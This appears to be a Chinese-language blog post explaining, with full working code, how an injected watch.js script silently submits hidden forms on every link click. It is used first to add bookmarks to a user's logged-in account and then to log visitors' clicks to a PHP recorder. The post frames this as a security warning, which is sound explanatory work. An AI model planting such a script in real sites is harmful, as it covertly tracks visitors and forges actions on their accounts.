@@ -1,0 +1,137 @@
+---
+title: 無所覺的表單動作, 在使用者未察覺的情形下自動送出表單
+category: programming
+old-category: JavaScript
+tags: []
+---
+<p>
+這是本人一時興起的試驗作品，寫完之後發現... 這是「惡意」的表單動作。因為我可以在使用者毫無所覺的情形下，記錄使用者瀏覽網站的每一個動作。
+</p>
+<p>
+原始動機起於我想要在每一個連結上加上「點擊即自動加入書籤」的功能。作法是為網頁上每一個連結都加上點擊事件 (click event) 。當使用者點擊連結時，事件處理函數會自動產生一個表單  (form) ，將連結的網址及標題 (連結標籤中的文字) 填入，再自動將表單送往 黑米共享書籤 (Hemidemi) ，即完成加入書籤的動作。整個過程中，表單是不可見及不可察覺的。瀏覽器仍然會載入連結，而使用者不會察覺到表單送出動作。
+</p>
+
+<!--more-->
+<h4>範例網頁 normal.html</h4>
+<pre class="highlight"><code><span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;head&gt;</span>
+  <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"content-type"</span> <span class="na">content=</span><span class="s">"text/html; charset=utf-8"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;title&gt;</span>範例網頁<span class="nt">&lt;/title&gt;</span>
+  <span class="nt">&lt;/head&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">'posted'</span> <span class="na">name=</span><span class="s">'posted'</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://www.google.com/"</span><span class="nt">&gt;</span>Google<span class="nt">&lt;/a&gt;&lt;br/&gt;</span>
+      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://tw.yahoo.com/"</span><span class="nt">&gt;</span>Yahoo!<span class="nt">&lt;/a&gt;&lt;br/&gt;</span>
+      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://blog.roodo.com/"</span><span class="nt">&gt;</span>Roodo<span class="nt">&lt;/a&gt;&lt;br/&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+
+<span class="nt">&lt;script</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"watch.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre>
+
+<p>
+這是一個非常平凡的網頁，裡面有三個連結。我說過要用點擊事件觸發自動表單動作，但這裡看不到任何傳統的 <code>onclick=xxx</code> 敘述。實則玄機都在第 15 行載入的 watch.js 中。
+</p>
+
+<h4>watch.js</h4>
+<pre class="highlight"><code><span class="kd">function</span> <span class="nx">gotYou</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">h</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'iframe'</span><span class="p">);</span>
+    <span class="nx">h</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s1">'hiddenFrame'</span><span class="p">;</span>
+    <span class="nx">h</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s1">'none'</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">childNodes</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">;</span> <span class="o">--</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">childNodes</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">nodeType</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nb">document</span><span class="p">.</span><span class="nx">childNodes</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">h</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="kd">var</span> <span class="nx">hc</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">var</span> <span class="nx">titleText</span> <span class="o">=</span> <span class="nx">hc</span><span class="p">(</span><span class="s1">'input'</span><span class="p">);</span>
+    <span class="kd">with</span><span class="p">(</span><span class="nx">titleText</span><span class="p">){</span><span class="nx">name</span><span class="o">=</span><span class="s1">'user_bookmark[url]'</span><span class="p">;</span><span class="nx">value</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">href</span><span class="p">;}</span>
+    <span class="kd">var</span> <span class="nx">urlText</span> <span class="o">=</span> <span class="nx">hc</span><span class="p">(</span><span class="s1">'input'</span><span class="p">);</span>
+    <span class="kd">with</span><span class="p">(</span><span class="nx">urlText</span><span class="p">){</span><span class="nx">name</span><span class="o">=</span><span class="s1">'user_bookmark[title]'</span><span class="p">;</span><span class="nx">value</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">firstChild</span><span class="p">.</span><span class="nx">nodeValue</span><span class="p">;}</span>
+    <span class="kd">var</span> <span class="nx">permission</span> <span class="o">=</span> <span class="nx">hc</span><span class="p">(</span><span class="s1">'input'</span><span class="p">);</span>
+    <span class="kd">with</span><span class="p">(</span><span class="nx">permission</span><span class="p">){</span><span class="nx">name</span><span class="o">=</span><span class="s1">'user_bookmark[permission]'</span><span class="p">;</span><span class="nx">value</span><span class="o">=</span><span class="s1">'public'</span><span class="p">;}</span>
+
+    <span class="kd">var</span> <span class="nx">form</span> <span class="o">=</span> <span class="nx">hc</span><span class="p">(</span><span class="s1">'form'</span><span class="p">);</span>
+    <span class="kd">with</span><span class="p">(</span><span class="nx">form</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s1">'none'</span><span class="p">;</span>
+        <span class="nx">appendChild</span><span class="p">(</span><span class="nx">titleText</span><span class="p">);</span>
+        <span class="nx">appendChild</span><span class="p">(</span><span class="nx">urlText</span><span class="p">);</span>
+        <span class="nx">appendChild</span><span class="p">(</span><span class="nx">permission</span><span class="p">);</span>
+        <span class="nx">method</span> <span class="o">=</span> <span class="s1">'POST'</span><span class="p">;</span>
+        <span class="nx">target</span> <span class="o">=</span> <span class="s1">'hiddenFrame'</span><span class="p">;</span>
+        <span class="c1">//action = 'http://www.hemidemi.com/user_bookmark/create';</span>
+        <span class="nx">action</span> <span class="o">=</span> <span class="s1">'http://localhost/test/i_know_where_you_go.php'</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">childNodes</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">;</span> <span class="o">--</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">childNodes</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">nodeType</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nb">document</span><span class="p">.</span><span class="nx">childNodes</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">form</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="nx">form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">anchors</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">anchors</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">anchors</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nx">gotYou</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
+        <span class="p">};</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre>
+
+
+<p>
+在 watch.js 中，為 <var>window.onload</var> 事件指派了一個事件處理函數。該函數抓出了網頁中的所有連結，然後為這些連結指派了 <var>onclick</var> 事件處理函數 <var>gotYou()</var> 。這是第一步：為每個連結添加點擊事件處理函數。
+</p>
+<p>
+看到 <var>gotYou()</var> 的內容，由於表單呈送動作 (submit) 一定會觸發瀏覽器載入新頁面的動作，為了讓使用者無所覺，必須建立一個 iframe 並將其指派為表單的動作目標視窗 (target) 。<var>gotYou()</var> 接著自動建立一個表單及表單欄位，並填入欄位內容。最後送出表單 (<code>form.submit();</code>) 。iframe 和表單都設定不顯示，因此使用者不會察覺我已經產生一個表單並將其送出。
+</p>
+<p>
+看到此處，有興趣的讀者可以將範例網頁和 watch.js 存起來，將 watch.js 第 32 行的 <code>action</code> 指派之內容改成黑米書籤的書籤建立服務 (即第 31 行的網址) 。啟動瀏覽器，先登入黑米書籤再開啟範例網頁，接著點擊任一連結。瀏覽器照常載入連結的網頁，看似一切正常。這時請再回到黑米書籤，將會發現剛才的網頁已經被加入共享書籤了。
+</p>
+<div class="note">
+在 IE 中 (我測的是 IE6) ，此處無法指派表單動作目標為 iframe ，送出表單時 IE 會自動開啟新視窗載入表單的回傳結果。所以用 IE6 時，會看到瀏覽器新增了一個視窗，而新視窗中會顯示黑米書籤中加入了一個新書籤。
+</div>
+
+<h4>i_know_where_you_go.php</h4>
+<p>
+如果我只做到上面為止，或許看起來是個「體貼的自動化功能」。但接下來我要寫一個簡單的 PHP 程式 (i_know_where_you_go.php) 放在網路上，並將 watch.js 中的表單動作網址指派為這個 PHP 程式。同樣的動作，現在變成了一個使用者動作的記錄器。使用者在這頁面上點了什麼連結，全都記錄在 i_know_where_you_go.log 之中。
+</p>
+<pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">ob_start</span><span class="p">();</span>
+<span class="nb">print_r</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
+<span class="nv">$postContents</span> <span class="o">=</span> <span class="nb">ob_get_contents</span><span class="p">();</span>
+<span class="nb">ob_end_clean</span><span class="p">();</span>
+
+<span class="nv">$s</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d H:i:s'</span><span class="p">)</span> <span class="o">.</span> <span class="s2">": GOT YOU!</span><span class="se">\n</span><span class="s2">"</span> <span class="o">.</span> <span class="nv">$postContents</span><span class="p">;</span>
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'i_know_where_you_go.log'</span><span class="p">,</span> <span class="nv">$s</span><span class="p">,</span> <span class="nx">FILE_APPEND</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">all</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// just for IE</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre>
+
+<p>
+剛剛 IE 的使用者還會看到新視窗，這裡我加上了 <code>window.close()</code> 敘述直接把新視窗關掉。現在 IE 的使用者點擊連結後，只會發現「好像」閃了一下，接著注意力就放在載入的連結網頁上。渾然不知剛剛的點擊動作已經被我記錄下來了。
+</p>
+<p>
+具有資安意識的讀者，應該已經想到如果自己的網頁被人植入一行–僅僅一行– JavaScript 的載入標籤，就足以把所有瀏覽自己網頁的參觀者都出賣了。
+</p>
+<h6>相關文章</h6>
+<ul>
+<li><a href="{{ site.baseurl }}/archives/2007/JavaScript%20Hijacking%20and%20How%20to.html">JavaScript Hijacking and How to</a></li>
+</ul>
+<div class="note">樂多舊網址: <a href="http://blog.roodo.com/rocksaying/archives/2665954.html">http://blog.roodo.com/rocksaying/archives/2665954.html</a></div>
